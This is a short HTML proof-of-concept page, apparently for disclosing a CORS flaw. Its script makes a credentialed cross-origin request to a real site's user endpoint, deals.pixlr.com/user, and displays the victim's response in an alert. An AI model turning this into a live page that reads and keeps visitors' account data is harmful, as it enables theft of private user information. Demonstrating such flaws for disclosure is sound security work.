<html>
<body>
<script>
var url = 'https://deals.pixlr.com/user';

function load(url) {
  var xhr = new XMLHttpRequest();
  xhr.withCredentials = true;
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
      alert(xhr.response);
    }
  }

  xhr.open('GET', url, true);
  xhr.send('');
}
load(url)
</script>
</body>
</html>
